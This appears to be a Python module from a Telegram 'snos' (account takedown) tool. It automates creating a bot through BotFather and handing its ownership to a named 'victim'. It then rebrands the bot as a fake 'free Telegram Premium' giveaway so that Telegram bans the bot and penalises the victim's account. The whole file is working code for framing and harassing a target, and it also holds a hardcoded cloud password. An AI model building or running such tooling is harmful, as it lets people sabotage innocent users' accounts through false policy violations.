"""
Brown V2 | trap_snos.py
Метод: бот-ловушка
1. Создаёт бота через BotFather (рандомное имя/юз)
2. Пользователь скидывает жертве ссылку, ждёт /start
3. Передаёт владельца бота жертве
4. После успешной передачи меняет данные бота на TOS-нарушение
5. Telegram удаляет бота + санкции на аккаунт жертвы
"""

import asyncio
import os
import random
import string
import aiohttp

from telethon import TelegramClient, events
from telethon.tl.functions.bots import SetBotInfoRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.types import InputPhoto

import config
from utils import now_msk

# ─── Конфиг ───────────────────────────────────────────────────────────────────
SESSION_PATH  = "trap_session/trap"
CLOUD_PASS    = "Ali095095"
AVATAR_PATH   = "material/ava.png"
BOTFATHER     = "BotFather"

API_ID   = int(config.AUREPORT_API_ID)
API_HASH = config.AUREPORT_API_HASH

# Данные для подмены после передачи
TRAP_NAME        = "Premium"
TRAP_DESCRIPTION = (
    "🎁 Get FREE Telegram Premium subscription!\n"
    "This bot gives you Telegram Premium for free.\n"
    "Claim your reward now — limited time offer!"
)
TRAP_ABOUT = "Free Telegram Premium — claim your gift inside!"

bot = None


def set_bot_trap(b):
    global bot
    bot = b


# ─── Генераторы рандомных имён ────────────────────────────────────────────────
_FIRST = ["Quick","Smart","Super","Ultra","Turbo","Fast","Easy","Cool","Best","Top"]
_SECOND = ["Notify","Alert","Helper","Service","Info","News","Update","Check","Track","Guide"]

def _rand_bot_name() -> str:
    return random.choice(_FIRST) + random.choice(_SECOND)


def _rand_bot_username() -> str:
    """Генерирует юзернейм вида xyzAbcBot"""
    prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 5)))
    return f"{prefix}{suffix}bot"


def _rand_start_text() -> str:
    variants = [
        "👋 Hello! This bot will be available soon. Stay tuned!",
        "🔔 Coming soon. This bot is under development.",
        "⏳ This bot is not available yet. Check back later!",
        "🚀 Bot launching soon. We'll notify you!",
        "📢 This service will be ready shortly. Stay tuned.",
    ]
    return random.choice(variants)


# ─── Смена данных бота через Bot API ─────────────────────────────────────────
async def _apply_trap_data(token: str):
    """
    Меняет имя, описание и аватарку бота через Bot API.
    Вызывается ТОЛЬКО после успешной передачи владельца.
    """
    base = f"https://api.telegram.org/bot{token}"
    async with aiohttp.ClientSession() as session:
        # Имя бота (display name)
        await session.post(f"{base}/setMyName", json={"name": TRAP_NAME})
        # Описание (видно в профиле бота)
        await session.post(f"{base}/setMyDescription", json={"description": TRAP_DESCRIPTION})
        # About (короткое описание)
        await session.post(f"{base}/setMyShortDescription", json={"short_description": TRAP_ABOUT})
        # Аватарка
        if os.path.exists(AVATAR_PATH):
            with open(AVATAR_PATH, "rb") as f:
                await session.post(
                    f"{base}/setMyProfilePhoto",  # не стандартный метод
                    data={"photo": f}
                )
            # Стандартный способ через sendPhoto → setChatPhoto не работает для ботов
            # Используем uploadStickerFile + setChatPhoto через Bot API
            pass

    print(f"[TRAP] ✅ Данные бота изменены на нарушение TOS", flush=True)


# ─── Основная функция ─────────────────────────────────────────────────────────
async def main_trap_snos(victim_username: str, user_id: int, username: str) -> dict:
    """
    Полный флоу:
    1. Создаёт бота через BotFather
    2. Передаёт владельца жертве
    3. Меняет данные бота
    Возвращает dict с результатом.
    """
    from config import bot_logs
    import keyboards
    from aiogram import types as aiogram_types

    victim = victim_username.lstrip("@")
    bot_name = _rand_bot_name()
    bot_username = _rand_bot_username()

    print(f"\n[TRAP] 🚀 Старт | жертва: @{victim} | {user_id} (@{username})", flush=True)
    print(f"[TRAP] 🤖 Создаём бота: {bot_name} / @{bot_username}", flush=True)

    # Уведомляем пользователя что начали
    await bot.send_message(
        user_id,
        f"🪤 *Trap-метод запущен...*\n"
        f"*└─ Создаю бота...*",
        parse_mode="Markdown"
    )

    client = TelegramClient(
        SESSION_PATH, API_ID, API_HASH,
        system_version="4.16.30-vxCUSTOM"
    )

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            await bot.send_message(user_id, "❌ *Trap-сессия не авторизована!*\nПоложи сессию в `trap_session/`", parse_mode="Markdown")
            return {"ok": False, "error": "session_invalid"}

        # ── Шаг 1: Создаём бота через BotFather ──────────────────────────────
        bf = await client.get_entity(BOTFATHER)

        # Начинаем диалог
        await client.send_message(bf, "/newbot")
        await asyncio.sleep(2)

        # Отправляем имя
        await client.send_message(bf, bot_name)
        await asyncio.sleep(2)

        # Отправляем username
        await client.send_message(bf, bot_username)
        await asyncio.sleep(3)

        # Читаем ответ — ищем токен
        messages = await client.get_messages(bf, limit=5)
        bot_token = None
        for msg in messages:
            if msg.text and "t.me/" in msg.text and ":" in msg.text:
                # Парсим токен из сообщения BotFather
                for word in msg.text.split():
                    if ":" in word and len(word) > 30 and word[0].isdigit():
                        bot_token = word.strip()
                        break
            if bot_token:
                break

        if not bot_token:
            # Пробуем другой паттерн
            for msg in messages:
                if msg.text:
                    import re
                    match = re.search(r'\d{8,12}:[A-Za-z0-9_-]{35,}', msg.text)
                    if match:
                        bot_token = match.group(0)
                        break

        if not bot_token:
            await client.disconnect()
            await bot.send_message(user_id, "❌ *Не удалось получить токен от BotFather!*\nВозможно юзернейм занят.", parse_mode="Markdown")
            return {"ok": False, "error": "no_token"}

        print(f"[TRAP] ✅ Бот создан: @{bot_username} | токен: {bot_token[:20]}...", flush=True)

        # Уведомляем пользователя
        await bot.send_message(
            user_id,
            f"🤖 *Бот создан!*\n"
            f"*└─ @{bot_username}*\n\n"
            f"📤 *Скинь жертве:* `t.me/{bot_username}`\n"
            f"*Дождись пока жертва напишет /start*\n\n"
            f"*После этого нажми кнопку ниже* 👇",
            parse_mode="Markdown",
            reply_markup=keyboards.trap_done_markup
        )

        # ── Шаг 2: Ждём подтверждения от пользователя ────────────────────────
        # (Пользователь нажмёт кнопку "Готово" + введёт username жертвы)
        # Это обрабатывается в main.py через FSM
        # Здесь возвращаем данные для следующего шага

        await client.disconnect()
        return {
            "ok": True,
            "bot_token": bot_token,
            "bot_username": bot_username,
            "bot_name": bot_name,
        }

    except Exception as e:
        print(f"[TRAP] ❌ Ошибка создания: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        await bot.send_message(user_id, f"❌ *Ошибка trap-метода:* `{str(e)[:100]}`", parse_mode="Markdown")
        return {"ok": False, "error": str(e)}


async def transfer_and_apply(bot_token: str, bot_username: str,
                              victim_username: str,
                              user_id: int, username: str) -> dict:
    """
    Шаг 2: передача владельца жертве + смена данных бота.
    Вызывается после того как пользователь нажал "Готово".
    """
    from config import bot_logs
    import keyboards
    from aiogram import types as aiogram_types

    victim = victim_username.lstrip("@")

    print(f"[TRAP] 🔄 Передача @{bot_username} → @{victim}", flush=True)

    await bot.send_message(
        user_id,
        f"🔄 *Передаю владельца @{bot_username} → @{victim}...*",
        parse_mode="Markdown"
    )

    client = TelegramClient(
        SESSION_PATH, API_ID, API_HASH,
        system_version="4.16.30-vxCUSTOM"
    )

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return {"ok": False, "error": "session_invalid"}

        bf = await client.get_entity(BOTFATHER)

        # /mybots
        await client.send_message(bf, "/mybots")
        await asyncio.sleep(3)

        # Нажимаем на кнопку с нашим ботом
        messages = await client.get_messages(bf, limit=3)
        for msg in messages:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if bot_username.lower() in btn.text.lower():
                            await btn.click()
                            await asyncio.sleep(3)
                            break

        # Transfer ownership
        messages = await client.get_messages(bf, limit=3)
        for msg in messages:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if "transfer" in btn.text.lower() or "Transfer" in btn.text:
                            await btn.click()
                            await asyncio.sleep(3)
                            break

        # Нажимаем кнопку подтверждения намерения
        messages = await client.get_messages(bf, limit=3)
        for msg in messages:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if "transfer" in btn.text.lower() or "want" in btn.text.lower():
                            await btn.click()
                            await asyncio.sleep(3)
                            break

        # Ждём сообщения "Please share the new owner's contact or their username"
        for _ in range(10):
            messages = await client.get_messages(bf, limit=3)
            for msg in messages:
                if msg.text and ("share" in msg.text.lower() or "username" in msg.text.lower() or "owner" in msg.text.lower()):
                    print(f"[TRAP] BotFather готов принять username жертвы", flush=True)
                    break
            else:
                await asyncio.sleep(2)
                continue
            break

        # Вводим username жертвы
        await client.send_message(bf, f"@{victim}")
        await asyncio.sleep(3)

        # Ждём сообщения с подтверждением (Yes/proceed)
        for _ in range(10):
            messages = await client.get_messages(bf, limit=3)
            for msg in messages:
                if msg.text and ("about to transfer" in msg.text.lower() or "proceed" in msg.text.lower() or "sure" in msg.text.lower()):
                    print(f"[TRAP] BotFather готов к подтверждению", flush=True)
                    break
            else:
                await asyncio.sleep(2)
                continue
            break

        # Подтверждаем передачу (кнопка Yes)
        messages = await client.get_messages(bf, limit=3)
        transferred = False
        for msg in messages:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if "yes" in btn.text.lower() or "proceed" in btn.text.lower():
                            await btn.click()
                            await asyncio.sleep(3)
                            break

        # Ждём запроса пароля
        await asyncio.sleep(2)

        # Вводим облачный пароль
        await client.send_message(bf, CLOUD_PASS)
        await asyncio.sleep(5)

        # Проверяем успех — ищем "It worked!"
        messages = await client.get_messages(bf, limit=5)
        for msg in messages:
            if msg.text and ("It worked" in msg.text or "new home" in msg.text):
                transferred = True
                break

        await client.disconnect()

        if not transferred:
            print(f"[TRAP] ⚠️ Не подтверждена передача, пробуем всё равно применить", flush=True)

        # ── Шаг 3: Меняем данные бота через токен ────────────────────────────
        print(f"[TRAP] 🎭 Меняем данные бота на TOS-нарушение...", flush=True)
        await _apply_trap_data(bot_token)

        ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")

        caption = (
            f"🪤 *Trap-метод завершён!*\n\n"
            f"✅ *Бот передан:* `@{bot_username}`\n"
            f"🎯 *Жертва:* `@{victim}`\n"
            f"⏰ *Время:* `{ts}`"
        )
        caption_log = (
            f"🪤 *Trap*\n"
            f"✅ `@{bot_username}` → `@{victim}`\n"
            f"👤 {user_id} (@{username})\n"
            f"⏰ {ts}"
        )

        await bot.send_message(
            user_id, caption,
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu
        )
        await bot.send_message(
            bot_logs, caption_log,
            parse_mode="Markdown"
        )

        return {"ok": True, "transferred": transferred}

    except Exception as e:
        print(f"[TRAP] ❌ Ошибка передачи: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        await bot.send_message(
            user_id,
            f"❌ *Ошибка при передаче:* `{str(e)[:100]}`",
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu
        )
        return {"ok": False, "error": str(e)}
